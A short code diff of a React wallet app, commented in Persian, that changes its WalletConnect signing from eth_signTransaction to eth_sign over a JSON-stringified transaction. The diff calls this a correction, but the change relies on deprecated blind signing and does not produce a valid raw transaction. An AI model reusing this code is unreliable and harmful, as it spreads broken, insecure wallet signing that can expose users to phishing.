@@ -10,7 +10,7 @@ function App() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56], // فقط BSC
-      methods: ["eth_signTransaction", "eth_sendRawTransaction"], // روش صحیح برای Trust Wallet
+      methods: ["eth_sign", "eth_sendRawTransaction"], // اصلاح شده
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -41,10 +41,10 @@ function App() {
         var unsignedTx = JSON.parse(result);
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        // **✅ امضای تراکنش با `eth_signTransaction`**
+        // **✅ امضای تراکنش با `eth_sign`**
         var signedTx = await provider.request({
-          method: "eth_signTransaction",
-          params: [unsignedTx.result],
+          method: "eth_sign",
+          params: [address, JSON.stringify(unsignedTx.result)],
         });
 
         console.log("✍️ Signed Transaction:", signedTx);
